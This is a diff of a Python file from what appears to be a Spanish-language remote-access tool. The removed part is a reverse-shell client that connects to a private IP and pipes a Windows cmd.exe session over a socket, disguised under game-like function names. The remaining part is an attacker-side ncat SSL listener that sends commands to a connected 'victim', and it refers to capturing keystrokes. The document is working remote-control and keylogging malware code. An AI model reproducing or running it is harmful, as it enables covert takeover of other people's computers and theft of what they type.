@@ -1,66 +1,3 @@
-"""
-import threading
-import subprocess
-import socket
-
-
-def rcv_gme(s, CMD):
-    while True:
-        try:
-            command = s.recv(1024)
-            if not command:
-                break
-            CMD.stdin.write(command)
-            CMD.stdin.flush()
-        except Exception:
-            break
-
-
-def sdn_gme(s, CMD):
-    while True:
-        output = CMD.stdout.readline()
-        if not output:
-            break
-        s.send(output)
-
-
-def games(port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('192.168.131.45', port))
-
-        # Crear el proceso con un shell interactivo
-        xxx = subprocess.Popen('cmd.exe', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                               stdin=subprocess.PIPE)
-
-        # Leer la salida del proceso en un hilo adicional y enviarla al socket
-        ompt_rcv = threading.Thread(target=rcv_gme, args=(s, xxx))
-        ompt_rcv.start()
-
-        ompt_sdn = threading.Thread(target=sdn_gme, args=(s, xxx))
-        ompt_sdn.start()
-
-        ompt_rcv.join()
-        ompt_sdn.join()
-
-        s.close()
-        xxx.terminate()
-    except ConnectionResetError:
-        pass
-    except Exception:
-        pass
-
-def init_game():
-
-    t = threading.Thread(target=games, args=(5009,))
-    t.start()
-
-    t.join()
-
-
-if __name__ == '__main__':
-    init_game()
-"""
 import subprocess
 import tempfile
 import threading
@@ -68,35 +5,59 @@ from colorama import Fore
 import colorama
 import certs
 
+#
+# Autor   ->  an0mal1a
+# Name    ->  Pablo
+# GitHub  ->  https://github.com/an0mal1a
+# Correo  -> pablodiez024@proton.me
+#
 
+# Crear archivo temporal del certificado
 cert = tempfile.NamedTemporaryFile(delete=False)
 cert.write(certs.get_crte().encode())
 cert.close()
 
+# Crear archivo temporal de la clave
 key = tempfile.NamedTemporaryFile(delete=False)
 key.write(certs.get_locker().encode())
 key.close()
 
 colorama.init()
+
+# Proceso principal
 ncat = subprocess.Popen(['ncat', '-nvl', '5001', '--ssl-cert', cert.name, '--ssl-key', key.name], stdout=subprocess.PIPE,
             stdin=subprocess.PIPE)
 
 
+# Enviar comandos
 def snd_nc():
     try:
         while True:
-            command = input(Fore.RED + "" + Fore.RESET)
+            command = input(Fore.RED + " " + Fore.RESET)
             if command:
-
+                # Comando para terminar la conexion
                 if command == "terminate":
                     print(Fore.RED + "[!] Cerrando conexión por comandos..." + Fore.RESET)
                     ncat.stdin.write("exit".encode() + "\n".encode())
                     ncat.stdin.flush()
                     ncat.communicate()
-                    return "terminate"
+
+                    # Si se ha ejecutado server.py, avisar que sigue en escucha
+                    if __name__ != "__main__":
+                        print(Fore.YELLOW + "\t[*] Escuchando keystrokes..." + Fore.RESET)
+
+                    break
+
                 else:
+                    # Enviar el comando
                     ncat.stdin.write(command.encode() + "\n".encode())
                     ncat.stdin.flush()
+
+            elif "NCAT DEBUG".encode() in ncat.stdout.read():
+                print(Fore.RED + "\nConexion closed by victim" + Fore.RESET)
+                exit()
+        return "terminate"
+
     except UnicodeDecodeError:
         print(Fore.RED + "\n\n[!] Exiting session..." + Fore.RESET)
         exit()
@@ -119,6 +80,7 @@ def recv_nc():
                 print(decoded_line)
     except ValueError:
         pass
+
 
 def main():
     try:
